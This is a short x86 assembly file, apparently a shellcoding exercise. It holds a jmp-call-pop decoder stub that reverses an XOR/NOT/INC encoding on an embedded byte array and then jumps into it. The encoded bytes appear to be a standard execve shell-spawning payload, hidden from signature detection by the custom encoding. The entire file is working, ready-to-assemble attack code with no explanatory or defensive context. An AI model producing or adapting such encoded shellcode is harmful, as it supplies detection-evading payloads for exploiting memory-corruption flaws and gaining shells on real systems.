global _start

section .text

_start:

	jmp short step_1


step_2:
	pop edi

decoder:

	cmp byte [edi],0xbb
	jz shellcode

	xor byte [edi],0xbb  ;xor with bb
	not byte [edi]	     ;not operation
	inc byte [edi]       ;inc byte

	inc edi
	jmp short decoder


step_1:
	call step_2
	shellcode: db 0x74,0xfb,0x0b,0x23,0x29,0x6a,0x36,0x23,0x23,0x6a,0x6a,0x25,0x2c,0xcc,0xa6,0x0b,0xcc,0xa5,0x16,0xcc,0xa4,0xeb,0x4e,0x88,0x3b,0xbb
